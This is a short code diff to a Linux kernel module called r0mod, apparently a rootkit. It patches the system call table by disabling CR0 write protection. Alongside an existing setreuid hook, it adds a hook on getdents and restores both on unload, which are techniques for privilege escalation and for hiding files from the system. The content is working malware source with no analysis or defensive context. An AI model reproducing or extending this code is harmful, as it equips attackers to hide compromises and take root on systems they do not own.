@@ -6,6 +6,7 @@
 #include <linux/syscalls.h> // syscalls
 #include <linux/capability.h>
 
+#include <config.h>
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
@@ -94,6 +95,8 @@ static int __init r0mod_init(void)
 
     orig_setreuid = (void *)sct[__NR_setreuid];
     sct[__NR_setreuid] = (unsigned long)new_setreuid;
+    orig_getdents = (void *)sct[__NR_getdents];
+    sct[__NR_getdents] = (unsigned long)new_getdents;
 
     write_cr0(read_cr0() | 0x10000);
 
@@ -109,6 +112,7 @@ static void __exit r0mod_exit(void)
         write_cr0(read_cr0() & (~0x10000));
 
         sct[__NR_setreuid] = (unsigned long)orig_setreuid;
+        sct[__NR_getdents] = (unsigned long)orig_getdents;
 
         write_cr0(read_cr0() | 0x10000);
     }
